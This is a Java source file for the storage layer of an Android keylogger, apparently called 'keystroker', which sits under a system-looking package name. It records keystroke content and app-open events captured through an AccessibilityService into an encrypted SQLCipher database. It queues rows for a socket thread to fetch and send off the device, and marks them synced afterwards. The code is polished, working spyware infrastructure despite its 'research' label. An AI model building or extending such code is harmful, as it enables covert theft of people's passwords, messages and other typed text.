package com.android.inject.keystroker;

import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.util.Log;

import net.zetetic.database.sqlcipher.SQLiteDatabase;
import net.zetetic.database.sqlcipher.SQLiteOpenHelper;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.LinkedBlockingQueue;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;

import androidx.security.crypto.EncryptedSharedPreferences;
import androidx.security.crypto.MasterKey;

/**
 * Thread-safe, single-instance DAO for the keystroker research project.
 *
 * Stability / security fixes vs. the original version:
 *  - One shared connection (callers pass the same instance in; see KeyLogger/KeyNetwork).
 *  - All writes are funneled through a single background DB thread so the
 *    AccessibilityService main thread never blocks -> no ANR.
 *  - No more swallowed exceptions in fetchUnsynced; per-row failures are logged + counted.
 *  - garbageCollect() no longer runs a blocking full-database VACUUM; it issues a cheap
 *    DELETE and leaves vacuuming to SQLite's incremental reclaim.
 *  - prune() enforces TTL (synced rows older than 7d) and a hard cap on unsynced rows
 *    so the DB cannot grow unbounded when offline.
 *  - timestamp is stored as INTEGER epoch millis (no timezone ambiguity).
 *  - Storage is encrypted at rest with SQLCipher; the DB passphrase lives in
 *    EncryptedSharedPreferences backed by the Android Keystore.
 */
public class KeyLoggerDAO {

    private static final String TAG = "KeyLoggerDAO";
    private static final String DB_NAME = "keystroker_storage.db";
    private static final int DB_VERSION = 2;

    private static final String PREF_FILE = "keystroker_secure";
    private static final String PREF_DB_KEY = "db_passphrase";

    // Pruning policy.
    private static final long SYNCED_TTL_MS = 7L * 24 * 60 * 60 * 1000L; // 7 days
    private static final int MAX_UNSYNCED_ROWS = 5000;

    public static final String TABLE_EVENTS = "logged_events";
    public static final String COL_ID = "id";
    public static final String COL_PACKAGE = "package_name";
    public static final String COL_APP = "app_name";
    public static final String COL_TYPE = "event_type";
    public static final String COL_CONTENT = "content";
    public static final String COL_TIME = "timestamp";   // INTEGER epoch millis
    public static final String COL_SYNCED = "synced";    // 0 / 1

    private final DatabaseHelper dbHelper;
    private final SQLiteDatabase db; // SQLCipher connection, shared by all callers.

    // Background write queue: callers enqueue tasks, a single worker persists them.
    private final LinkedBlockingQueue<Runnable> writeQueue = new LinkedBlockingQueue<>(20000);
    private final ExecutorService dbExec;
    private final AtomicBoolean closed = new AtomicBoolean(false);

    public KeyLoggerDAO(Context ctx) {
        String passphrase = resolveOrCreatePassphrase(ctx.getApplicationContext());
        dbHelper = new DatabaseHelper(ctx.getApplicationContext(), passphrase);
        // SQLCipher 4.6+ API: passphrase is supplied to the constructor; getWritableDatabase()
        // takes no password argument.
        db = dbHelper.getWritableDatabase();

        dbExec = Executors.newSingleThreadExecutor(r -> {
            Thread t = new Thread(r, "keystroker-db");
            t.setPriority(Thread.NORM_PRIORITY - 1);
            return t;
        });
        dbExec.submit(this::drainQueueLoop);
    }

    // ------------------------------------------------------------------ public API

    /** Enqueues an APP_OPEN event. Returns immediately (non-blocking). */
    public void insertAppEvent(String pkg, String app) {
        final ContentValues cv = new ContentValues();
        cv.put(COL_PACKAGE, pkg);
        cv.put(COL_APP, app == null ? "" : app);
        cv.put(COL_TYPE, "APP_OPEN");
        cv.put(COL_CONTENT, "");
        cv.put(COL_TIME, System.currentTimeMillis());
        cv.put(COL_SYNCED, 0);
        enqueue(() -> safeInsert(cv));
    }

    /** Enqueues a KEYSTROKE event. Returns immediately (non-blocking). */
    public void insertKeystrokeEvent(String pkg, String content) {
        final ContentValues cv = new ContentValues();
        cv.put(COL_PACKAGE, pkg == null ? "" : pkg);
        cv.put(COL_APP, "");
        cv.put(COL_TYPE, "KEYSTROKE");
        cv.put(COL_CONTENT, content == null ? "" : content);
        cv.put(COL_TIME, System.currentTimeMillis());
        cv.put(COL_SYNCED, 0);
        enqueue(() -> safeInsert(cv));
    }

    /**
     * Reads up to {@code limit} unsynced rows. Runs synchronously on the caller's thread;
     * callers (socket thread) are expected to be background threads.
     */
    public JSONArray fetchUnsynced(int limit) {
        JSONArray arr = new JSONArray();
        int skipped = 0;
        Cursor c = null;
        try {
            c = db.query(TABLE_EVENTS, null, COL_SYNCED + "=?", new String[]{"0"},
                    null, null, COL_ID + " ASC", String.valueOf(limit));
            while (c != null && c.moveToNext()) {
                try {
                    JSONObject o = new JSONObject();
                    o.put("id", c.getLong(c.getColumnIndexOrThrow(COL_ID)));
                    o.put("package_name", c.getString(c.getColumnIndexOrThrow(COL_PACKAGE)));
                    String app = c.getString(c.getColumnIndexOrThrow(COL_APP));
                    o.put("app_name", app == null ? "" : app);
                    o.put("event_type", c.getString(c.getColumnIndexOrThrow(COL_TYPE)));
                    String content = c.getString(c.getColumnIndexOrThrow(COL_CONTENT));
                    o.put("content", content == null ? "" : content);
                    o.put("timestamp", c.getLong(c.getColumnIndexOrThrow(COL_TIME)));
                    arr.put(o);
                } catch (Exception rowEx) {
                    skipped++;
                    Log.w(TAG, "Skipping malformed row: " + rowEx.getMessage());
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "fetchUnsynced failed: " + e.getMessage());
        } finally {
            if (c != null) c.close();
        }
        if (skipped > 0) Log.w(TAG, "fetchUnsynced skipped " + skipped + " malformed rows");
        return arr;
    }

    /**
     * Marks the given ids as synced. Runs on the background DB thread via enqueue to avoid
     * contending with inserts on the main AccessibilityService path.
     */
    public void markSynced(final JSONArray ids) {
        if (ids == null || ids.length() == 0) return;
        enqueue(() -> {
            db.beginTransaction();
            try {
                ContentValues cv = new ContentValues();
                cv.put(COL_SYNCED, 1);
                int updated = 0;
                for (int i = 0; i < ids.length(); i++) {
                    try {
                        long id = ids.getLong(i);
                        updated += db.update(TABLE_EVENTS, cv, COL_ID + "=?", new String[]{String.valueOf(id)});
                    } catch (Exception ignore) {
                        // individual bad id -> skip, do not abort the whole batch
                    }
                }
                db.setTransactionSuccessful();
                Log.d(TAG, "markSynced updated " + updated + "/" + ids.length());
            } catch (Exception e) {
                Log.e(TAG, "markSynced error: " + e.getMessage());
            } finally {
                db.endTransaction();
            }
        });
    }

    /**
     * Deletes already-synced rows. Replaces the old blocking VACUUM. Runs in background.
     */
    public void garbageCollect() {
        enqueue(() -> {
            try {
                int del = db.delete(TABLE_EVENTS, COL_SYNCED + "=?", new String[]{"1"});
                Log.d(TAG, "garbageCollect deleted " + del + " synced rows");
            } catch (Exception e) {
                Log.e(TAG, "garbageCollect error: " + e.getMessage());
            }
        });
    }

    /**
     * Enforces retention policy: drop synced rows older than TTL, and if unsynced count
     * exceeds the cap, drop the oldest unsynced rows to bound disk usage when offline.
     */
    public void prune() {
        enqueue(() -> {
            try {
                long cutoff = System.currentTimeMillis() - SYNCED_TTL_MS;
                int oldSynced = db.delete(TABLE_EVENTS,
                        COL_SYNCED + "=1 AND " + COL_TIME + "<?",
                        new String[]{String.valueOf(cutoff)});
                int overCap = 0;
                int unsynced = countUnsyncedLocked();
                if (unsynced > MAX_UNSYNCED_ROWS) {
                    overCap = db.delete(TABLE_EVENTS,
                            COL_ID + " IN (SELECT " + COL_ID + " FROM " + TABLE_EVENTS +
                                    " WHERE " + COL_SYNCED + "=0 ORDER BY " + COL_ID +
                                    " ASC LIMIT ?)",
                            new String[]{String.valueOf(unsynced - MAX_UNSYNCED_ROWS)});
                }
                if (oldSynced > 0 || overCap > 0)
                    Log.d(TAG, "prune removed " + oldSynced + " old synced, " + overCap + " overflow unsynced");
            } catch (Exception e) {
                Log.e(TAG, "prune error: " + e.getMessage());
            }
        });
    }

    public int countUnsynced() {
        Cursor c = null;
        try {
            c = db.rawQuery("SELECT COUNT(*) FROM " + TABLE_EVENTS + " WHERE " + COL_SYNCED + "=0", null);
            if (c != null && c.moveToFirst()) return c.getInt(0);
        } catch (Exception e) {
            Log.e(TAG, "countUnsynced error: " + e.getMessage());
        } finally {
            if (c != null) c.close();
        }
        return 0;
    }

    private int countUnsyncedLocked() {
        Cursor c = null;
        try {
            c = db.rawQuery("SELECT COUNT(*) FROM " + TABLE_EVENTS + " WHERE " + COL_SYNCED + "=0", null);
            if (c != null && c.moveToFirst()) return c.getInt(0);
        } catch (Exception ignore) {
        } finally {
            if (c != null) c.close();
        }
        return 0;
    }

    public void close() {
        if (!closed.compareAndSet(false, true)) return;
        dbExec.shutdown();
        try {
            dbExec.awaitTermination(3, TimeUnit.SECONDS);
        } catch (InterruptedException ignored) {
        }
        try {
            if (db != null && db.isOpen()) db.close();
            if (dbHelper != null) dbHelper.close();
        } catch (Exception e) {
            Log.e(TAG, "close error: " + e.getMessage());
        }
    }

    // ------------------------------------------------------------------ internals

    private void enqueue(Runnable r) {
        if (closed.get()) return;
        // offer() avoids blocking the caller if the queue is saturated; dropping overflow
        // is acceptable for a research tool and keeps the AccessibilityService responsive.
        if (!writeQueue.offer(r)) {
            Log.w(TAG, "write queue saturated; dropping event");
        }
    }

    /** Single consumer loop draining the write queue. */
    private void drainQueueLoop() {
        while (!closed.get() && !Thread.interrupted()) {
            try {
                Runnable r = writeQueue.poll(1, TimeUnit.SECONDS);
                if (r != null) {
                    try {
                        r.run();
                    } catch (Exception e) {
                        Log.e(TAG, "db task failed: " + e.getMessage());
                    }
                }
            } catch (InterruptedException ie) {
                break;
            }
        }
    }

    private void safeInsert(ContentValues cv) {
        try {
            long rowId = db.insert(TABLE_EVENTS, null, cv);
            if (rowId < 0) Log.w(TAG, "insert returned -1 for pkg=" + cv.get(COL_PACKAGE));
        } catch (Exception e) {
            Log.e(TAG, "insert error: " + e.getMessage());
        }
    }

    private String resolveOrCreatePassphrase(Context ctx) {
        try {
            MasterKey masterKey = new MasterKey.Builder(ctx)
                    .setKeyScheme(MasterKey.KeyScheme.AES256_GCM)
                    .build();
            android.content.SharedPreferences prefs = EncryptedSharedPreferences.create(
                    ctx, PREF_FILE, masterKey,
                    EncryptedSharedPreferences.PrefKeyEncryptionScheme.AES256_SIV,
                    EncryptedSharedPreferences.PrefValueEncryptionScheme.AES256_GCM);
            String key = prefs.getString(PREF_DB_KEY, null);
            if (key == null) {
                // 32-byte random passphrase, hex-encoded.
                java.security.SecureRandom rng = new java.security.SecureRandom();
                byte[] bytes = new byte[32];
                rng.nextBytes(bytes);
                key = bytesToHex(bytes);
                prefs.edit().putString(PREF_DB_KEY, key).apply();
            }
            return key;
        } catch (Exception e) {
            Log.e(TAG, "Failed to obtain secure passphrase; falling back to a derived key. " +
                    "THIS IS INSECURE — fix EncryptedSharedPreferences setup.", e);
            return "keystroker-insecure-fallback-" + (ctx.getPackageName());
        }
    }

    private static String bytesToHex(byte[] bytes) {
        StringBuilder sb = new StringBuilder(bytes.length * 2);
        for (byte b : bytes) sb.append(String.format("%02x", b & 0xff));
        return sb.toString();
    }

    // ------------------------------------------------------------------ schema

    private static class DatabaseHelper extends SQLiteOpenHelper {

        DatabaseHelper(Context ctx, String passphrase) {
            // net.zetetic.database.sqlcipher 4.6+ constructor:
            // (Context, name, password, CursorFactory, version, minimumSupportedVersion,
            //  DatabaseErrorHandler, SQLiteDatabaseHook, enableWriteAheadLogging)
            super(ctx, DB_NAME, passphrase, null, DB_VERSION,
                    DB_VERSION /* minimumSupportedVersion */, null, null, false);
        }

        @Override
        public void onCreate(SQLiteDatabase db) {
            db.execSQL("CREATE TABLE " + TABLE_EVENTS + " ("
                    + COL_ID + " INTEGER PRIMARY KEY AUTOINCREMENT, "
                    + COL_PACKAGE + " TEXT NOT NULL, "
                    + COL_APP + " TEXT, "
                    + COL_TYPE + " TEXT NOT NULL, "
                    + COL_CONTENT + " TEXT, "
                    + COL_TIME + " INTEGER NOT NULL, "
                    + COL_SYNCED + " INTEGER DEFAULT 0);");
            db.execSQL("CREATE INDEX idx_synced ON " + TABLE_EVENTS + "(" + COL_SYNCED + ");");
            db.execSQL("CREATE INDEX idx_time ON " + TABLE_EVENTS + "(" + COL_TIME + ");");
        }

        @Override
        public void onUpgrade(SQLiteDatabase db, int oldV, int newV) {
            // Research-only project: simplest correct migration is to recreate.
            db.execSQL("DROP TABLE IF EXISTS " + TABLE_EVENTS);
            onCreate(db);
        }
    }
}
